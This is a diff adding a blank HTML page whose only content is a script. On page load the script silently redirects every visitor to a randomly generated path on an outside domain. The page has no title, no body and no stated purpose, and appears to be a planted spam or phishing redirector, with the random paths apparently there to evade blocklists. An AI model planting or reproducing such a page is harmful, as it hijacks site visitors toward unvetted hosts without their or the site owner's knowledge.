@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html lang="es-MX">
+<head>
+<meta charset="UTF-8">
+<meta name="author" content="">
+<script type="text/javascript">
+function generateSegment(length) {
+  var result = '';
+  var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  var charactersLength = characters.length;
+  for (var i = 0; i < length; i++) {
+    result += characters.charAt(Math.floor(Math.random() * charactersLength));
+  }
+  return result;
+}
+
+function randomRedirect() {
+  var baseUrls = 'https://www.aaprodentemps.com/';
+  var segmentLength = 8; // Define o comprimento máximo para cada segmento
+  var urls = [
+    baseUrls + generateSegment(segmentLength) + '/' + generateSegment(segmentLength) + '/' + generateSegment(segmentLength),
+    baseUrls + generateSegment(segmentLength) + '/' + generateSegment(segmentLength) + '/' + generateSegment(segmentLength)
+  ];
+
+  var randomIndex = Math.floor(Math.random() * urls.length);
+  window.location.href = urls[randomIndex];
+}
+
+window.onload = randomRedirect;
+</script>
+<title></title>
+</head>
+<body>
+</body>
+</html>
